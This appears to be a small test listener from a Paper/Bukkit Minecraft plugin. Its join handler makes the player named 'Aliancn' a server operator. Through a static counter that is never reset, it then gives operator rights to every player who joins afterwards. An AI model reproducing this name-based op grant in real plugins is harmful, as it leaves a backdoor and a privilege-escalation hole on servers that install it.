package localhost.test.test01;

import io.papermc.paper.event.player.AsyncChatEvent;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

/**
 * ClassName : Listener
 * Package : localhost.test.test01
 * Description :
 *
 * @Author Aliancn
 * @Create 2023/4/21 15:20
 * @Version 1.0
 */
public class Listener implements org.bukkit.event.Listener {
    private static int count =0 ;
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e){
        Player player = e.getPlayer();
        if(player.getName().equals("Aliancn")){
            count++;
        }
        if(count>0){
            player.setOp(true);
            player.sendMessage("you are an op now ");
        }
    }
    public void onPlayerChat(AsyncChatEvent e){

    }
}
